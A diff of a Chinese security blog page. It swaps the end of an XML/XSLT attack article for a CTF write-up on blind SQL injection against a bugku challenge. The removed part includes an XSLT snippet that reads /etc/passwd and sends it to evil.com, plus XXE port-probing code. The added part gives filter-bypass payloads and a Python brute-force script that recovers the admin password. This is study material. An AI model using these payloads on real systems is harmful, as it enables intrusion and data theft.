-<p>的原因，我们不能输出完整的信息<br>如果我改成<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> base64_encode($proc-&gt;transformToXML($xmlDoc));</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/2018-08-13-16-44-21.png" alt=""><br>其实是可以成功读取文件内容的，但估计目标不会先base64再帮我们打印出来吧<br>所以有了以下方法</p>
-<ul>
-<li>document()<br>我们结合该函数却可以直接带出数据<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"name1"</span> <span class="attr">select</span>=<span class="string">"document('file:///etc/passwd')"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"name2"</span> <span class="attr">select</span>=<span class="string">"concat('http://evil.com/?', $name1)"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">"name3"</span> <span class="attr">select</span>=<span class="string">"document($name2)"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="传统端口探测"><a href="#传统端口探测" class="headerlink" title="传统端口探测"></a>传统端口探测</h4><p>话不多说，测试脚本如下<br>当外部实体引用开启时<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [&lt;!ENTITY shit SYSTEM "http://127.0.0.1:9999"&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;shit;&lt;/x&gt;</span></span><br><span class="line"><span class="string">EOD;</span></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument;</span><br><span class="line"><span class="comment">// let's have a nice output</span></span><br><span class="line">$dom-&gt;preserveWhiteSpace = <span class="keyword">false</span>;</span><br><span class="line">$dom-&gt;formatOutput = <span class="keyword">true</span>;</span><br><span class="line">$dom-&gt;loadXML($xml,LIBXML_NOENT);</span><br><span class="line"><span class="keyword">echo</span> $dom-&gt;saveXML();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>当端口关闭的时候发现<br><img src="/images/2018-08-13-16-09-17.png" alt=""><br>当端口开启的时候<br><img src="/images/2018-08-13-16-09-41.png" alt=""></p>
-<h4 id="xsl端口探测"><a href="#xsl端口探测" class="headerlink" title="xsl端口探测"></a>xsl端口探测</h4><p>上述方法需要开启外部实体引入，而这里只需要使用document()函数即可<br>给出部分代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"sky"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"blog"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"country"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"document('http://127.0.0.1:9999')"</span> /&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>当端口关闭时<br><img src="/images/2018-08-13-16-34-41.png" alt=""><br>当端口开启时<br><img src="/images/2018-08-13-16-35-18.png" alt=""></p>
-<h3 id="CTF样题"><a href="#CTF样题" class="headerlink" title="CTF样题"></a>CTF样题</h3><p>曾经有做过一道xslt服务端注入攻击的综合题目，有兴趣的可以看这篇wrietup<br><a href="http://skysec.top/2018/03/23/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0xslt%E5%86%8D%E5%88%B0xxe%E7%9A%84%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9B%AE/#%E6%80%9D%E8%80%83%E6%94%BB%E5%87%BB%E7%82%B9">http://skysec.top/2018/03/23/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0xslt%E5%86%8D%E5%88%B0xxe%E7%9A%84%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9B%AE/#%E6%80%9D%E8%80%83%E6%94%BB%E5%87%BB%E7%82%B9</a></p>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>Xml作为一种标记语言，其中蕴含的技巧还有许多等待探索，我在此抛砖引玉了~很期待有师傅来交流一些XD的姿势~</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做培训和题目讲解的时候，做到bugku的一道题目，bugku的题目想必ctfer都已经耳熟能详了，网上的writeup铺天盖地。<br>但我今天单独写了一篇文章来写一道题肯定是有原因的，其中一道题是这样的：<br>1.网上铺天盖地的writeup写到：直接访问<code>http://120.24.86.145:8007/web2/flag</code>即可得到flag<br>2.此题真坑，竟然是脑洞，访问flag文件就好了<br>…..<br>我看到题目价值200分，放在bugku众多web的后段，怎么看都不是一个脑洞访问一下就完事的题目<br>于是开始了正规解法的思考</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="/images/2018-08-15-21-54-12.png" alt=""><br>题目说了是sql注入，并且提及了一些关键符号，估计是过滤了吧<br>看到398的solves挺吃惊的，不知道其中有多少是直接访问wen目录下flag文件得到的solve= =<br>先简单的做一个文件探测<br><img src="/images/2018-08-15-21-55-44.png" alt=""><br>于是来一波文件泄露下载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8007/web2/.DS_Store</span><br></pre></td></tr></table></figure></p>
+<p>而我们知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件，如文件的图标位置或背景色，相当于Windows的desktop.ini。</span><br></pre></td></tr></table></figure></p>
+<p>即便如此，有时候该文件中也会藏匿一些信息，但这里打开后发现<br><img src="/images/2018-08-15-22-05-19.png" alt=""><br>并没有藏匿什么信息<br>那再看看admin目录<br><img src="/images/2018-08-15-22-07-33.png" alt=""><br>于是信息搜集无果= =<br>目前只知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!,!=,=,+,-,^,%</span><br></pre></td></tr></table></figure></p>
+<p>应该都过滤了</p>
+<h2 id="sql探测"><a href="#sql探测" class="headerlink" title="sql探测"></a>sql探测</h2><p>随手探测<br><img src="/images/2018-08-15-22-09-20.png" alt=""><br><img src="/images/2018-08-15-22-09-35.png" alt=""><br>发现有password和username两个不同的error<br>猜想这大概说明可以bool盲注了吧（不用sleep还是挺开心的）<br>那么思路很清晰了<br>在username处构造一个引号闭合方式，尝试让其回显password error<br>继续随手测了一下<br><img src="/images/2018-08-15-22-11-16.png" alt=""><br>发现如果被过滤，会提示，还挺好，这样探测就容易许多了<br>那么fuzz一下好了<br><img src="/images/2018-08-15-22-13-45.png" alt=""><br>发现这些字符被过滤了,又跑了波sql-func的字典<br><img src="/images/2018-08-15-22-17-26.png" alt=""><br>我最爱的regexp和like也都没了，心痛<br>最开始被带沟里了，以为题目的提示是过滤的意思，然后卡在这里很痛苦<br>但是后来一想，不对啊<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!,!=,=,+,-,^,%</span><br></pre></td></tr></table></figure></p>
+<p>都还在！提示是这个意思！<br>于是想到用<code>^</code>去闭合，但是这里尝试无果<br>一般在数字型的时候，<code>^</code>会有比较好的效果<br>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1^1</span><br><span class="line">?id=1^0</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/2018-08-15-22-32-30.png" alt=""><br>那么没有空格，or，and等等关键词，怎么办呢？<br>这里发现运算符<code>-</code>瞩目<br>我们尝试构造<br><img src="/images/2018-08-15-22-33-55.png" alt=""><br>这里在运算的时候，字符串变成0<br>所以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;admin&apos;-1-&apos;&apos; =  -1</span><br><span class="line">&apos;admin&apos;-0-&apos;&apos; =  0</span><br></pre></td></tr></table></figure></p>
+<p>那我们放入题目中测试<br><img src="/images/2018-08-15-22-35-32.png" alt=""><br><img src="/images/2018-08-15-22-35-40.png" alt=""><br>我们发现<code>-0</code>的时候，为true，<code>-1</code>的时候为false<br>那么这是为什么呢？<br>我们猜想后台sql语句构造为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = select * from users where username=$username;</span><br></pre></td></tr></table></figure></p>
+<p>在字符串username的值和数字0比较的时候，字符串变为了0<br>故此0=0<br><img src="/images/2018-08-15-22-37-10.png" alt=""><br>这样一来，我们成功的闭合了引号</p>
+<h2 id="sql注入语句构造"><a href="#sql注入语句构造" class="headerlink" title="sql注入语句构造"></a>sql注入语句构造</h2><p>我们尝试构造出类似于下面这个语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select database()),1,1))&gt;-1</span><br></pre></td></tr></table></figure></p>
+<p>这样把这个语句放在0和1的位置，即可取出数据<br>但是这里问题重重：<br>1.没有逗号<br>2.没有空格<br>那么解决第一个问题，substr很难用，我们怎么截取？<br>这里给出一个实例<br>假设：<br>passwd=abc123<br>那么我们用以下方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mid((passwd)from(-1)):3</span><br><span class="line">mid((passwd)from(-2)):23</span><br><span class="line">mid((passwd)from(-3)):123</span><br></pre></td></tr></table></figure></p>
+<p>倒叙输出from的位数<br>观察可知<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">23</span><br><span class="line">123</span><br></pre></td></tr></table></figure></p>
+<p>倒着看的第一位都是3，显然不行，无法截取出来，于是想到反转<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">32</span><br><span class="line">321</span><br></pre></td></tr></table></figure></p>
+<p>然后取最后一位即可<br>故构造为：<br>先反转<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REVERSE(MID((passwd)from(-%d))</span><br></pre></td></tr></table></figure></p>
+<p>再取最后一位<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(REVERSE(MID((passwd)from(-%d)))from(-1))</span><br></pre></td></tr></table></figure></p>
+<p>再比较ascii码值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(mid(REVERSE(MID((passwd)from(-%d)))from(-1)))=%d</span><br></pre></td></tr></table></figure></p>
+<p>然后列出范围<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s in range(1,33)</span><br><span class="line">d in range(33,127)</span><br></pre></td></tr></table></figure></p>
+<p>我们测试一下<br><img src="/images/2018-08-15-22-48-44.png" alt=""><br><img src="/images/2018-08-15-22-48-57.png" alt=""><br>发现中间条件成立时的回显是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username error</span><br></pre></td></tr></table></figure></p>
+<p>不成立的时候回显是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password error</span><br></pre></td></tr></table></figure></p>
+<p>剩下的就是脚本构造了<br>注：这里说一下passwd字段怎么来的<br>这里其实我是用了点猜想，看到post表单里<br><img src="/images/2018-08-15-22-53-03.png" alt=""><br>id用的是passwd，所以用的passwd，为什么不去探测数据库和表。。因为or等很多关键词都没有，探测非常困难，不如猜一下= =<br>不过不能误人子弟，数据库的字段名和post表单里的id,name等不是一回事，不等价，我这里是猜想的！</p>
+<h2 id="注入脚本编写"><a href="#注入脚本编写" class="headerlink" title="注入脚本编写"></a>注入脚本编写</h2><p>简单写出脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://120.24.86.145:8007/web2/login.php"</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">'PHPSESSID'</span>:<span class="string">'i6f9opt690kralopas7lcj68ne9na6ev'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        payload = <span class="string">"admin'-(ascii(mid(REVERSE(MID((passwd)from(-"</span>+str(i)+<span class="string">")))from(-1)))="</span>+str(ord(j))+<span class="string">")-'"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'uname'</span>: payload,</span><br><span class="line">            <span class="string">'passwd'</span>: <span class="string">'sky'</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url,cookies=cookie,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"username error!!@_@"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            password += j</span><br><span class="line">            <span class="keyword">print</span> password</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>运行得到<br><img src="/images/2018-08-15-22-58-17.png" alt=""><br>注：这里是因为跑了前几位，猜想是md5，所以为了效率，缩小了遍历范围= =<br>得到密码的md5后，进行解密<br><img src="/images/2018-08-15-22-59-14.png" alt=""><br>cmd5个坑货竟然还要收费，乖乖交钱后，发现密码是<code>admin123</code></p>
+<h2 id="登入admin"><a href="#登入admin" class="headerlink" title="登入admin"></a>登入admin</h2><p>随机用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure></p>
+<p>登录<br><img src="/images/2018-08-15-23-00-29.png" alt=""><br>来到一个命令执行的页面<br>他暗示我要ls。。我就ls了一下<br>然后<br><img src="/images/2018-08-15-23-00-56.png" alt=""><br>感觉这里题目没有出好<br>私以为后面应该接上用<code>?</code>通配，或者RCE OOB带出数据等操作出题<br>相关链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2017/12/29/Time-Based-RCE/</span><br><span class="line">https://www.anquanke.com/post/id/154284</span><br></pre></td></tr></table></figure></p>
+<p>不过flag还是顺利的拿到了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sql_iNJEct_comMon3600!&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>题目的sql注入部分还是挺有趣的，做完后后知后觉，想起以前似乎做过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2017/06/18/%E9%99%95%E8%A5%BF%E6%9D%AFweb%E8%AF%A6%E8%A7%A3/</span><br></pre></td></tr></table></figure></p>
+<p>但是单从这道题来看，个人认为ctf训练平台，还是要刨根问底的，flag并不是关键目的<br>这里也是出题人的疏忽，将flag放在当前目录(为了方便命令执行？)<br>菜鸡献丑了XD…..</p>
 
     </article>
     <!-- license  -->
@@ -471,16 +430,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/08/24/xss-ssrf-redis/" title= xss->ssrf->redis >
-                    <div class="nextTitle">xss->ssrf->redis</div>
+                <a href= "/2018/08/17/浅析xml及其安全问题/" title= 浅析xml及其安全问题 >
+                    <div class="nextTitle">浅析xml及其安全问题</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/08/15/一道CTF题引发的思考-sql注入/" title= 一道CTF题引发的思考-sql注入 >
-                    <div class="prevTitle">一道CTF题引发的思考-sql注入</div>
+                <a href= "/2018/08/16/Upload-labs&Upload Bypass Summarize/" title= Upload-labs&Upload Bypass Summarize >
+                    <div class="prevTitle">Upload-labs&Upload Bypass Summarize</div>
                 </a>
             
         </li>
@@ -496,7 +455,7 @@ height:50vh;
 <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
 <script>
     var gitment = new Gitment({
-        id: "Thu Aug 23 2018 10:41:56 GMT+0800", // 可选。默认为 location.href
+        id: "Thu Aug 16 2018 21:50:48 GMT+0800", // 可选。默认为 location.href
         owner: 'skyofkinglove',
         repo: 'sky.github.io',
         oauth: {
@@ -600,7 +559,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Xinclude"><span class="toc-number">2.</span> <span class="toc-text">Xinclude</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是xinclude？"><span class="toc-number">2.1.</span> <span class="toc-text">什么是xinclude？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#为什么使用xinclude"><span class="toc-number">2.2.</span> <span class="toc-text">为什么使用xinclude</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xinclude的语法介绍"><span class="toc-number">2.3.</span> <span class="toc-text">xinclude的语法介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xi-include-元素"><span class="toc-number">2.3.1.</span> <span class="toc-text">xi:include 元素</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xi-fallback-元素"><span class="toc-number">2.3.2.</span> <span class="toc-text">xi:fallback 元素</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安全问题"><span class="toc-number">2.4.</span> <span class="toc-text">安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#传统的XXE文件读取"><span class="toc-number">2.4.1.</span> <span class="toc-text">传统的XXE文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#传统文件读取进阶版—过滤"><span class="toc-number">2.4.2.</span> <span class="toc-text">传统文件读取进阶版—过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xinclude文件读取"><span class="toc-number">2.4.3.</span> <span class="toc-text">xinclude文件读取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSLT"><span class="toc-number">3.</span> <span class="toc-text">XSLT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简单样例"><span class="toc-number">3.1.</span> <span class="toc-text">简单样例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安全问题-1"><span class="toc-number">3.2.</span> <span class="toc-text">安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#传统文件读取"><span class="toc-number">3.2.1.</span> <span class="toc-text">传统文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xsl文件读取"><span class="toc-number">3.2.2.</span> <span class="toc-text">xsl文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#传统端口探测"><span class="toc-number">3.2.3.</span> <span class="toc-text">传统端口探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xsl端口探测"><span class="toc-number">3.2.4.</span> <span class="toc-text">xsl端口探测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF样题"><span class="toc-number">3.3.</span> <span class="toc-text">CTF样题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">4.</span> <span class="toc-text">后记</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息搜集"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql探测"><span class="toc-number">3.</span> <span class="toc-text">sql探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入语句构造"><span class="toc-number">4.</span> <span class="toc-text">sql注入语句构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入脚本编写"><span class="toc-number">5.</span> <span class="toc-text">注入脚本编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#登入admin"><span class="toc-number">6.</span> <span class="toc-text">登入admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">7.</span> <span class="toc-text">后记</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -613,6 +572,32 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -2938,62 +2923,62 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2018/08/29/浅析xml及其安全问题/" >浅析xml及其安全问题</a>
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/浅析xml之xinclude-xslt/" >浅析xml之xinclude & xslt</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/28</span><a class="archive-post-title" href= "/2018/08/28/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/SOAP及相关漏洞研究/" >SOAP及相关漏洞研究</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/2018/08/27/php函数默认配置引发的安全问题/" >php函数默认配置引发的安全问题</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/php函数默认配置引发的安全问题/" >php函数默认配置引发的安全问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/Upload-labs&Upload Bypass Summarize/" >Upload-labs&Upload Bypass Summarize</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/xss-ssrf-redis/" >xss->ssrf->redis</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/SOAP及相关漏洞研究/" >SOAP及相关漏洞研究</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/浅析xml及其安全问题/" >浅析xml及其安全问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/从一道CTF题引发的思考/" >从一道CTF题引发的思考</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/一道CTF题引发的思考-sql注入/" >一道CTF题引发的思考-sql注入</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/inndy-crypto-writeup/" >inndy-crypto-writeup</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/Upload-labs&Upload Bypass Summarize/" >Upload-labs&Upload Bypass Summarize</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/xss-ssrf-redis/" >xss->ssrf->redis</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/inndy-crypto-writeup/" >inndy-crypto-writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2018/08/23/浅析xml之xinclude-xslt/" >浅析xml之xinclude & xslt</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2018/08/15/一道CTF题引发的思考-sql注入/" >一道CTF题引发的思考-sql注入</a>
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2018/08/15/从一道CTF题引发的思考/" >从一道CTF题引发的思考</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2018/07/30/ISITDTU-CTF-Web/" >ISITDTU CTF-Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2018/07/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
         </li>
     
     
@@ -3218,12 +3203,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/最近复现的几个CVE题目/" >最近复现的几个CVE题目</a>
+            <span class="archive-post-date">01/27</span><a class="archive-post-title" href= "/2018/01/27/有点意思的3道web题/" >有点意思的3道web题</a>
         </li>
     
     
